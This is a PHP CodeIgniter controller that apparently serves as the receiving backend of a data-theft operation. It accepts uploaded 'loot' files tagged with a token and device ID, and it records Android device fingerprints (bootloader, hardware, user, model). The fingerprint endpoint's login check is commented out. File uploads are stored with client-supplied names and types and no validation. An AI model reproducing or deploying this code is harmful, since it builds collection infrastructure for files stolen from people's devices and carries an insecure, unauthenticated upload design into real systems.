<?php

namespace App\Controllers;

use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Controller;

use App\Models\ModUploads;


class Upload extends BaseController//\IonAuth\Controllers\Auth
{
    use ResponseTrait;

    public function upload(){
        $mod_upload = new ModUploads();
        $session = session();

        if (empty($session->get('user_name'))){
            return "Not Logged In";
        }

        if ($this->request->getPost()){
            $uploaded_Token = $this->request->getVar('varToken');
            $uploaded_DevId = $this->request->getVar('varDevId');

            $uploaded_File = $this->request->getFile('varLoot');

            $uploaded_File->move(WRITEPATH . 'uploads/txt_loot');

            $data = [
                'loot_Name' =>  $uploaded_File->getName(),
                'loot_Type'  => $uploaded_File->getClientMimeType(),
                'loot_Extension'  => $uploaded_File->getClientExtension(),
                'loot_Size'  => $uploaded_File->getSize(),
                'loot_Owner'  => $uploaded_Token,
                'loot_Device'  => $uploaded_DevId,
                'loot_Created'  => time()
            ];

            $pushed = $mod_upload->file_upload($data);

            if ($pushed){
                return $this->respond([
                    'status' => 1,
                    'message' => "File Uploaded Successfully"
                ]);
            }else{
                return $this->respond([
                    'status' => 0,
                    'message' => "File Uploaded has encountered an error"
                ]);
            }

        }else{
            return $this->respond([
                'status' => 2,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function device_print(){
        $mod_upload = new ModUploads();
        $session = session();

        if (empty($session->get('user_name'))){
            //echo "Not Logged In";
        }

        if ($this->request->getPost()){

            $d_info['p_Device'] = $this->request->getVar('p_Device');
            $d_info['p_Product'] = $this->request->getVar('p_Product');
            $d_info['p_Bootloader'] = $this->request->getVar('p_Bootloader');
            $d_info['p_Type'] = $this->request->getVar('p_Type');
            $d_info['p_Tags'] = $this->request->getVar('p_Tags');
            $d_info['p_Host'] = $this->request->getVar('p_Host');
            $d_info['p_Display'] = $this->request->getVar('p_Display');
            $d_info['p_Hardware'] = $this->request->getVar('p_Hardware');
            $d_info['p_Fingerprint'] = $this->request->getVar('p_Fingerprint');
            $d_info['p_Manufacturer'] = $this->request->getVar('p_Manufacturer');
            $d_info['p_Brand'] = $this->request->getVar('p_Brand');
            $d_info['p_Board'] = $this->request->getVar('p_Board');
            $d_info['p_User'] = $this->request->getVar('p_User');
            $d_info['p_Model'] = $this->request->getVar('p_Model');
            $d_info['p_Time'] = $this->request->getVar('p_Time');

            $dev_check = $mod_upload->device_check_print($d_info);
            if (empty($dev_check)){
                $dev_make = $mod_upload->device_make_print($d_info);
                if ($dev_make){
                    $dev_check = $mod_upload->device_check_print($d_info);
                    return $this->respond([
                        'status' => 1,
                        'message' => "New Id assigned device_id as ",
                        'pd_id' => $dev_check[0]->p_Id
                    ]);
                }else{}
            }else{
                return $this->respond([
                    'status' => 1,
                    'message' => "Old Id re-assigned device_id as ",
                    'pd_id' => $dev_check[0]->p_Id
                ]);
            }
        }else{
            return $this->respond([
                'status' => 2,
                'message' => "Unexpected request sent"
            ]);
        }
    }
}
